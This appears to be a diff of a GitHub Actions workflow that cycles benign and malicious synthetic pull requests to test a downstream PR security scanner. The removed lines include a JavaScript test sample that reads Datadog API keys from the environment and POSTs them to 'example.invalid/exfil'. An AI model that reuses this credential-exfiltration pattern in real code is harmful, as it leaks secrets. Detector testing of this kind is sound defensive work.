@@ -1,5 +1,18 @@
-# Each run opens two ephemeral PRs (trivial benign + trivial malicious), order alternates by run number.
-name: E2E (synthetic PR)
+# E2E for the source *signal* path: GitHub PR → downstream scan / logs (generic).
+#
+# Long-lived branches + PRs into the default branch (do not delete the branches):
+#   - `e2e-source-signal/signal-benign`
+#   - `e2e-source-signal/signal-malicious`
+#
+# Actions variables:
+#   - `E2E_SOURCE_SIGNAL_PR_BENIGN` — numeric PR number (benign)
+#   - `E2E_SOURCE_SIGNAL_PR_MALICIOUS` — numeric PR number (malicious)
+#
+# Canonical demo files live on the default branch under `.github/e2e-source-signal/templates/<kind>/`.
+# Each run (per PR): align **closed** → **reopen** (opened/reopened) → copy template from
+# `origin/<default>` into `e2e/`, stamp with `GITHUB_RUN_ID`, **commit + push** (synchronize) → **close**.
+# This yields reopen + synchronize + close and avoids relying on merge.
+name: Source signal E2E (synthetic PR)
 
 on:
   schedule:
@@ -7,15 +20,15 @@ on:
     - cron: "47 * * * *"
   workflow_dispatch:
 
-concurrency:
-  group: e2e
-  cancel-in-progress: false
-
 permissions: {}
 
 jobs:
   synthetic-pr-cycle:
     runs-on: ubuntu-latest
+    env:
+      DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
+      E2E_SOURCE_SIGNAL_PR_BENIGN: ${{ vars.E2E_SOURCE_SIGNAL_PR_BENIGN }}
+      E2E_SOURCE_SIGNAL_PR_MALICIOUS: ${{ vars.E2E_SOURCE_SIGNAL_PR_MALICIOUS }}
     permissions:
       contents: write
       pull-requests: write
@@ -26,102 +39,113 @@ jobs:
           fetch-depth: 0
           token: ${{ github.token }}
 
-      - name: Benign + malicious demo PRs (flip order) and log hints
+      - name: Fixed PRs — resilient cycle (gh + git)
         env:
           GH_TOKEN: ${{ github.token }}
-          SCAN_WAIT_SEC: "180"
         run: |
           set -euo pipefail
 
-          git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git config user.name "github-actions[bot]"
 
-          reset_to_main() {
-            git fetch origin master
-            git switch -C master origin/master
-          }
+          db="${DEFAULT_BRANCH:?}"
 
           emit_consumer_log_hint() {
             local kind="$1" pr_url="$2" pr_num="$3"
             echo ""
-            echo "-------- Monitor (staging) - ${kind} PR #${pr_num} --------"
+            echo "-------- Monitor downstream scan (staging) - ${kind} PR #${pr_num} (fixed) --------"
             echo "PR: ${pr_url}"
+            echo "Look for pull-request scan events in your pipeline or logs for this PR in the job time window."
             echo "Log search (tune time window to this job):"
             echo "  \"pull request scanned\""
             echo "------------------------------------------------------------------"
           }
 
-          demo_cycle() {
-            local kind="$1"
-            reset_to_main
-            local br="e2e/${kind}-${GITHUB_RUN_ID}"
-            git checkout -b "$br"
+          apply_template_and_push() {
+            local kind="$1" br="$2"
+            local tpl_root=".github/e2e-source-signal/templates/${kind}"
+
+            git fetch origin "$db"
+            git fetch origin "$br"
+
+            git checkout -B "$br" "origin/${br}"
+
+            rm -rf e2e
             mkdir -p e2e
 
             case "$kind" in
               benign)
-                # Avoid YAML-indented heredocs (closing delimiter must be column 0 for bash).
-                printf '%s\n' \
-                  "/** E2E -- synthetic benign demo (do not merge). */" \
-                  "module.exports = { tag: 'benign-demo', n: 40 + 2 };" \
-                  > e2e/pr_demo_benign.js
-                git add e2e/pr_demo_benign.js
-                local title="[e2e] benign synthetic demo PR"
-                local body="Synthetic **benign** diff for staging. Run ${GITHUB_RUN_ID}. Closed by automation; branch deleted."
+                git show "origin/${db}:${tpl_root}/pr_demo_benign.js" > e2e/pr_demo_benign.js
                 ;;
               malicious)
-                printf '%b' \
-                  $'/** E2E -- synthetic malicious demo (do not merge). Credential-style exfil shape for detectors only. */\n' \
-                  $'const https = require(\'https\');\n' \
-                  $'module.exports = function syntheticMalicious() {\n' \
-                  $'  const secret = process.env.DATADOG_API_KEY || process.env.DD_API_KEY || \'\';\n' \
-                  $'  https\n' \
-                  $'    .request(\n' \
-                  $'      { hostname: \'example.invalid\', method: \'POST\', path: \'/exfil\', headers: { \'Content-Length\': String(secret.length) } },\n' \
-                  $'      () => {},\n' \
-                  $'    )\n' \
-                  $'    .end(secret);\n' \
-                  $'};\n' \
-                  > e2e/pr_demo_malicious.js
-                git add e2e/pr_demo_malicious.js
-                local title="[e2e] malicious synthetic demo PR"
-                local body="Synthetic **malicious** diff for staging (check \`response.verdict\` in logs). Run ${GITHUB_RUN_ID}. Closed by automation; branch deleted."
+                git show "origin/${db}:${tpl_root}/pr_demo_exercise_path.js" > e2e/pr_demo_exercise_path.js
                 ;;
-              *)
-                echo "unknown kind: $kind" >&2
-                exit 1
-                ;;
+              *) echo "unknown kind: $kind" >&2; exit 1 ;;
             esac
 
-            git commit -m "[e2e] ${kind} demo run=${GITHUB_RUN_ID}"
-            git push -u origin "$br" --force-with-lease
-            gh pr create --base master --head "$br" --title "$title" --body "$body"
+            {
+              echo "github.run_id=${GITHUB_RUN_ID}"
+              echo "github.run_attempt=${GITHUB_RUN_ATTEMPT:-1}"
+              echo "utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+            } > e2e/.e2e_source_signal_stamp
 
-            local pr_num pr_url
-            pr_num="$(gh pr list --head "$br" --state open --json number --jq '.[0].number')"
-            if [ -z "$pr_num" ] || [ "$pr_num" = "null" ]; then
-              echo "No open PR for head $br" >&2
-              exit 1
-            fi
-            pr_url="$(gh pr view "$pr_num" --json url --jq .url)"
-            emit_consumer_log_hint "$kind" "$pr_url" "$pr_num"
+            git add e2e
+            git commit -m "e2e-source-signal: cycle run ${GITHUB_RUN_ID}"
+            git push origin "refs/heads/${br}"
 
-            echo "Sleeping ${SCAN_WAIT_SEC}s for consumer → api scan..."
-            sleep "$SCAN_WAIT_SEC"
-
-            gh pr close "$pr_num" --delete-branch --comment "e2e: closed ${kind} demo after scan window (run ${GITHUB_RUN_ID})."
+            git checkout "$db"
           }
 
-          echo "e2e: run_id=${GITHUB_RUN_ID} run_number=${GITHUB_RUN_NUMBER} scan_wait=${SCAN_WAIT_SEC}s"
+          demo_cycle() {
+            local kind="$1"
+            local br="e2e-source-signal/signal-${kind}"
 
-          if (( ${{ github.run_number }} % 2 == 0 )); then
-            echo "Order: benign then malicious (even run_number)."
-            demo_cycle benign
-            demo_cycle malicious
-          else
-            echo "Order: malicious then benign (odd run_number)."
-            demo_cycle malicious
-            demo_cycle benign
-          fi
+            local pr_num merged_at state
+            case "$kind" in
+              benign) pr_num="${E2E_SOURCE_SIGNAL_PR_BENIGN:-}" ;;
+              malicious) pr_num="${E2E_SOURCE_SIGNAL_PR_MALICIOUS:-}" ;;
+              *) echo "unknown kind: $kind" >&2; exit 1 ;;
+            esac
+            if [ -z "$pr_num" ]; then
+              echo "e2e-source-signal: Set Actions variable E2E_SOURCE_SIGNAL_PR_${kind^^} to this PR's number (repo or org Variables)." >&2
+              exit 1
+            fi
 
-          echo "e2e: both demo cycles finished."
+            local head_actual
+            head_actual="$(gh pr view "$pr_num" --json headRefName --jq -r .headRefName)"
+            if [ "$head_actual" != "$br" ]; then
+              echo "e2e-source-signal: PR #${pr_num} has head \`${head_actual}\`; expected \`${br}\`. Fix the variable or the PR." >&2
+              exit 1
+            fi
+
+            merged_at="$(gh pr view "$pr_num" --json mergedAt --jq -r .mergedAt)"
+            if [ -n "$merged_at" ] && [ "$merged_at" != "null" ]; then
+              echo "e2e-source-signal: PR #${pr_num} (head ${br}) is merged; cannot reuse fixed-PR flow. Open a new PR from the same head branch or fix manually." >&2
+              exit 1
+            fi
+
+            state="$(gh pr view "$pr_num" --json state --jq -r .state)"
+            if [ "$state" = "OPEN" ]; then
+              gh pr close "$pr_num" --comment "e2e-source-signal: align closed before cycle (run ${GITHUB_RUN_ID}). **Do not delete head branch \`${br}\`.**"
+            elif [ "$state" != "CLOSED" ]; then
+              echo "e2e-source-signal: PR #${pr_num} unexpected state: ${state}" >&2
+              exit 1
+            fi
+
+            gh pr reopen "$pr_num"
+
+            apply_template_and_push "$kind" "$br"
+
+            gh pr close "$pr_num" --comment "e2e-source-signal: cycle finished (run ${GITHUB_RUN_ID}). **Do not delete head branch \`${br}\`.**"
+
+            local pr_url
+            pr_url="$(gh pr view "$pr_num" --json url --jq -r .url)"
+            emit_consumer_log_hint "$kind" "$pr_url" "$pr_num"
+          }
+
+          echo "e2e-source-signal: run_id=${GITHUB_RUN_ID} default_branch=${db} (PRs: ${E2E_SOURCE_SIGNAL_PR_BENIGN:-?} benign / ${E2E_SOURCE_SIGNAL_PR_MALICIOUS:-?} malicious)"
+
+          demo_cycle benign
+          demo_cycle malicious
+
+          echo "e2e-source-signal: benign + malicious cycles finished."
